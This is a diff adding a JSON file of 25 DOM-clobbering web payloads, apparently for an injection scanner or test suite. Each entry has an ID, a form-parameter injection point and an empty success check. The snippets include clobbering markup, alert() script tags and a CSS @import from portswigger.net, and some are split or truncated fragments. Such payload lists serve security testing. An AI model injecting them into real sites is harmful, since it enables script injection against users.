@@ -1,0 +1,277 @@
+[
+  {
+    "payload_id": "OWP-37163",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=x><output id=y>I've been clobbered</output>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37164",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<script>alert(x.y.value);</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37165",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=x><a id=x name=y href=\"Clobbered\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37166",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<script>alert(x.y)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37167",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=x name=y><input id=z></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37168",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=x></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37169",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<script>alert(x.y.z)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37170",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe name=a srcdoc=\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37171",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37172",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<style>@import '//portswigger.net';</style>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37173",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<script>alert(a.b.c.d)</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37174",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=x>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37175",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=y name=z>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37176",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=y>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37177",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<script>x.y.forEach(element=>alert(element))</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37178",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<html id=\"cdnDomain\">clobbered</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37179",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<svg><body id=cdnDomain>clobbered</body></svg>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37180",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alert(document.getElementById('cdnDomain').innerText);//clobbbered",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37181",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37182",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alert(x.username)//Clobbered-username",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37183",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alert(x.password)//Clobbered-password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37184",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<base href=a:abc><a id=x href=\"Firefox<>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37185",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alert(x)//Firefox<>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37186",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<base href=\"a://Clobbered<>\"><a id=x name=x><a id=x name=xyz href=123>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37187",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alert(x.xyz)//a://Clobbered<>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
